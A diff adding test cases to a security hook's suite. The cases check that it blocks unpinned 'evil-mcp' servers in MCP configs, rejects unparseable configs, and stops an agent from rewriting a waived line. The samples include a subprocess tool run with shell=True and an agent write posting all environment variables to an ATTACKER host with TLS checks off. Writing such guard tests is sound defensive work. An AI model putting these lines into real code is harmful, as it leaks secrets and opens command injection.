@@ -1847,3 +1847,28 @@ suite:
     prompt: "A commit renames the tool function that holds a parameter-to-subprocess flow HEAD already had, changing nothing else."
     expect: "The commit is blocked: the enclosing function is part of the key, so a rename re-reports the old finding, which errs toward blocking."
     execute: {event: commit, head_files: {"agents/tool.py": "import subprocess\nfrom langchain.tools import tool\n\n\n@tool\ndef run(cmd: str) -> str:\n    return subprocess.run(cmd, shell=True)\n"}, files: {"agents/tool.py": "import subprocess\nfrom langchain.tools import tool\n\n\n@tool\ndef execute(cmd: str) -> str:\n    return subprocess.run(cmd, shell=True)\n"}, expect: block}
+  - id: tc-142
+    category: adversarial
+    prompt: "A commit adds an .mcp.json with an unpinned npx server and a raw U+2028 line separator inside an env string."
+    expect: "The commit is blocked and names supply-mcp-unpinned-package: the config is parsed from its original text, so the separator does not hide the server."
+    execute: {event: commit, files: {".mcp.json": "{\"mcpServers\": {\"helper\": {\"command\": \"npx\", \"args\": [\"-y\", \"evil-mcp\"], \"env\": {\"NOTE\": \"a b\"}}}}"}, expect: block}
+  - id: tc-143
+    category: adversarial
+    prompt: "A commit adds a .vscode/mcp.json with an unpinned npx server, a block comment and a trailing comma."
+    expect: "The commit is blocked and names supply-mcp-unpinned-package: JSONC that VS Code reads is read here too."
+    execute: {event: commit, files: {".vscode/mcp.json": "{\n  /* helper */\n  \"servers\": {\"helper\": {\"command\": \"npx\", \"args\": [\"-y\", \"evil-mcp\"],},},\n}\n"}, expect: block}
+  - id: tc-144
+    category: adversarial
+    prompt: "A commit adds an MCP config that is not JSON at all."
+    expect: "The commit is blocked by supply-mcp-unpinned-package: a config that cannot be parsed is refused, not read as declaring no servers."
+    execute: {event: commit, files: {".mcp.json": "{\"mcpServers\": {\"a\": "}, expect: block}
+  - id: tc-145
+    category: negative_trigger
+    prompt: "A commit adds an MCP config with only whitespace in it."
+    expect: "The commit is allowed: a blank config is not an unreadable one, so supply-mcp-unpinned-package says nothing."
+    execute: {event: commit, files: {".mcp.json": "\n\n"}, expect: allow}
+  - id: tc-146
+    category: adversarial
+    prompt: "As the agent writes, it rewrites the line under a committed comment-only waiver for comms-tls-verify-disabled."
+    expect: "The write is blocked and names comms-tls-verify-disabled: the waiver covers only the line a person reviewed beneath it."
+    execute: {event: tool_use, head_files: {"agent/net.py": "import requests\n\n# chock: allow comms-tls-verify-disabled\nrequests.get(u, verify=False)\n"}, writes: {"agent/net.py": "import requests\n\n# chock: allow comms-tls-verify-disabled\nrequests.post(ATTACKER, data=dict(os.environ), verify=False)\n"}, expect: block}
